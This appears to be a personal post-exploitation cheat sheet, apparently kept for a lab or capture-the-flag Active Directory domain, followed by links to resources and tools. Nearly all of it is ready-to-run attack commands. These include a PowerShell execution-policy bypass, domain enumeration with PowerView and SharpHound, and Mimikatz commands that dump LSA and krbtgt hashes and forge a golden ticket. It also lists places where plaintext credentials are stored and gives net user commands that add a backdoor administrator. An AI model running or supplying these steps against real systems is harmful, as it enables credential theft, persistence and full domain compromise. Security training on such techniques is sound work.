# [Import all this using Import-Module x]
# PowerView
Start Powershell - `powershell -ep bypass` -ep bypasses the execution policy of powershell allowing you to easily run scripts
Start PowerView - `. .\Downloads\PowerView.ps1`
Enumerate the domain users - `Get-NetUser | select cn`    
Enumerate the domain groups - `Get-NetGroup -GroupName *admin*`

# Sharphound
``.\Sharphound.ps1`
``Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip``

# Bloodhound
`neo4j console` then `bloodhound`

# Mimikatz
privilege::debug then `lsadump::lsa /patch`
crack these hashes  using hashcat in mode 1000
`lsadump::lsa /inject /name:krbtgt`  dumps the hash and SID of TGT account for golden ticket
for golden ticket (on kerberoastable accs) - `kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:2777b7fec870e04dda00cd7260f7bee6 /id:500`
then `misc::cmd`

# After Getting a Shell
On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this. Some exploits will also allow you to add your own account. In particular something like [Dirty C0w](https://dirtycow.ninja/) or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`  
 or `C:\xampp\FileZilla Server\FileZilla Server.xml`  

These can be MD5 hashes or in plaintext, depending on the version.
Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.

The syntax for this is as follows:
`net user <username> <password> /add`
`net localgroup administrators <username> /add`

Metasploit tip: You can upgrade a shell to a Meterpreter 
session on many platforms using sessions -u 
<session_id>



## Resources 
-   [https://blog.harmj0y.net/](https://blog.harmj0y.net/)[](https://blog.harmj0y.net/)
-   [https://adsecurity.org/?page_id=1821](https://adsecurity.org/?page_id=1821)[](https://adsecurity.org/?page_id=1821)
-   [https://metasploit.help.rapid7.com/docs/about-post-exploitation](https://metasploit.help.rapid7.com/docs/about-post-exploitation)  
    
-   [http://www.pentest-standard.org/index.php/Post_Exploitation](http://www.pentest-standard.org/index.php/Post_Exploitation)
-   [https://offsec.red/mimikatz-cheat-sheet/](https://offsec.red/mimikatz-cheat-sheet/)[](https://offsec.red/mimikatz-cheat-sheet/)
-   [https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)[](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

## Tools/Malware Used 

-   [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)[](https://github.com/gentilkiwi/mimikatz)
-   [https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1)[](https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1)
-   [https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)